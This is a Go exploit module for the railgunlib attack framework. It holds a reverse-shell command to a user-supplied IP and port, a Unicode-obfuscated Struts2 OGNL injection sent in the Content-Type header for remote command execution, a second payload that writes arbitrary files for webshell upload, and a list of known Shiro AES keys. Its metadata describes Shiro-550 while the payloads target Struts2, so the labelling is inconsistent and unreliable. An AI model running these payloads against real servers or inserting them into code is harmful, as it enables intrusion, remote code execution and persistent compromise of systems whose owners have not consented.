package exp_product1

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_VUL1 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_VUL1) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	self.EchoInfoMsg(cmd)
	return
}
func (self *Exp_VUL1) Reverse1(ip, port string) (expResult exp_model.ExpResult) {
	rs := fmt.Sprintf("nohup bash -i >& /dev/tcp/%s/%s 0>&1 &", ip, port)
	return self.Cmd1(rs)
}

func (self *Exp_VUL1) Cmd2(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	// 构造payload
	shellPayload := `%{\u0028\u0023\u006e\u0069\u006b\u0065\u003d\u0027multipart/form-data\u0027\u0029\u002e\u0028\u0023\u0064\u006d\u003d\u0040\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0044\u0045\u0046\u0041\u0055\u004c\u0054\u005f\u004d\u0045\u004d\u0042\u0045\u0052\u005f\u0041\u0043\u0043\u0045\u0053\u0053\u0029\u002e\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003f\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003d\u0023\u0064\u006d\u0029\u003a\u0028\u0028\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u005b\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u0027\u005d\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u003d\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0040\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u0040\u0063\u006c\u0061\u0073\u0073\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0050\u0061\u0063\u006b\u0061\u0067\u0065\u004e\u0061\u006d\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0043\u006c\u0061\u0073\u0073\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0073\u0065\u0074\u004d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u0028\u0023\u0064\u006d\u0029\u0029\u0029\u0029\u002e\u0028\u0023\u0063\u006d\u0064\u003d\u0027lz520520\u0027\u0029\u002e\u0028\u0023\u0069\u0073\u0077\u0069\u006e\u003d\u0028\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0079\u0073\u0074\u0065\u006d\u0040\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0027\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0027\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0027\u0077\u0069\u006e\u0027\u0029\u0029\u0029\u002e\u0028\u0023\u0063\u006d\u0064\u0073\u003d\u0028\u0023\u0069\u0073\u0077\u0069\u006e\u003f\u007b\u0027\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002c\u0027\u002f\u0063\u0027\u002c\u0023\u0063\u006d\u0064\u007d\u003a\u007b\u0027\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068\u0027\u002c\u0027\u002d\u0063\u0027\u002c\u0023\u0063\u006d\u0064\u007d\u0029\u0029\u002e\u0028\u0023\u0070\u003d\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0023\u0063\u006d\u0064\u0073\u0029\u0029\u002e\u0028\u0023\u0070\u002e\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074\u0045\u0072\u0072\u006f\u0072\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0074\u0072\u0075\u0065\u0029\u0029\u002e\u0028\u0023\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u003d\u0023\u0070\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u0029\u002e\u0028\u0023\u0072\u006f\u0073\u003d\u0028\u0040\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0073\u0074\u0072\u0075\u0074\u0073\u0032\u002e\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0067\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u0029\u0029\u002e\u0028\u0040\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002e\u0069\u006f\u002e\u0049\u004f\u0055\u0074\u0069\u006c\u0073\u0040\u0063\u006f\u0070\u0079\u0028\u0023\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u002c\u0023\u0072\u006f\u0073\u0029\u0029\u002e\u0028\u0023\u0072\u006f\u0073\u002e\u0066\u006c\u0075\u0073\u0068\u0028\u0029\u0029}`
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	headers.Set("Content-Type", shellPayload)

	// 发送请求
	httpresp := self.HttpGet(self.Params.Target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	expResult.Result = httpresp.Body
	return

}
func (self *Exp_VUL1) Upload2(filename string, content string) (expUploadResult exp_model.ExpUploadResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path='lzfilename').(#shell='lzcontent').(new java.io.BufferedWriter(new java.io.FileWriter(#path).append(#shell)).close()).(#cmd='echo path:'+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`
	shellPayload = strings.Replace(shellPayload, "lzfilename", filename, 1)
	shellPayload = strings.Replace(shellPayload, "lzcontent", content, 1)
	headers.Set("Content-Type", shellPayload)

	// 发送请求
	httpresp := self.HttpGet(self.Params.Target, headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	keyword := ""
	if len(httpresp.Body) > 4 {
		keyword = httpresp.Body[:4]
	} else {
		keyword = httpresp.Body
	}
	if len(httpresp.Body) > 4 {
		if httpresp.Resp.StatusCode == 200 && keyword == "path" {
			expUploadResult.Status = true
			expUploadResult.RespPath = httpresp.Body
		}
	}

	return
}

func (self *Exp_VUL1) GetMsg2(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`
	headers["Content-Type"] = []string{shellPayload}

	// 发送请求
	httpresp := self.HttpGet(self.Params.Target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	expResult.Result = httpresp.Body

	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())

	expSubOption := exp_model.ExpSubOption{
		CmdContent: "",
		CmdSubOptions: []exp_model.ExpSubOptionItem{
			{
				StaticText: "并发数: ",
				Key:        "tasks",
				Value:      "20",
			},
		},
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: exp_model.ExpMsg{
			Author: `lz520520`,
			Time:   `2016-08-03`,
			Range:  `Apache Shiro <= 1.2.4`,
			ID:     `shiro-550`,
			Describe: `
Shiro提供了（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。
但是，AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。
`,
			Details: `
漏洞验证
	payload1: 只有获取信息功能，输入URL点击获取即可，可快速获取目标的key以及加密算法。
	
漏洞利用
	payload3:
		1. tomcat回显利用链。
		2. 手动选择gadget，点击获取信息和命令执行即可利用漏洞

key参考：
"kPH+bIxk5D2deZiIxcaaaA==","2AvVhdsgUs0FSA3SDFAdag==","3AvVhmFLUs0KTA3Kprsdag==","4AvVhmFLUs0KTA3Kprsdag==",
"5aaC5qKm5oqA5pyvAAAAAA==","6ZmI6I2j5Y+R5aSn5ZOlAA==","bWljcm9zAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==",
"Z3VucwAAAAAAAAAAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","U3ByaW5nQmxhZGUAAAAAAA==","5AvVhmFLUs0KTA3Kprsdag==",
"fCq+/xW488hMTCD+cmJ3aQ==","1QWLxg+NYmxraMoxAXu/Iw==","ZUdsaGJuSmxibVI2ZHc9PQ==","L7RioUULEFhRyxM7a2R/Yg==",
"r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw=="
`,
			Payload: ``,
		},
		SubOptions: map[string]exp_model.ExpSubOption{
			"1": expSubOption,
		},
		AliasMap: map[string]string{
			"1": "KeyCheck",
			"2": "NoDependEcho",
			"3": "TomcatEcho",
			"4": "AllGadgetsTest",
			"5": "GadgetCheckWithSleep",
		},
	}

	exp_register.ExpStructRegister(&Exp_VUL1{}, registerMsg)

}
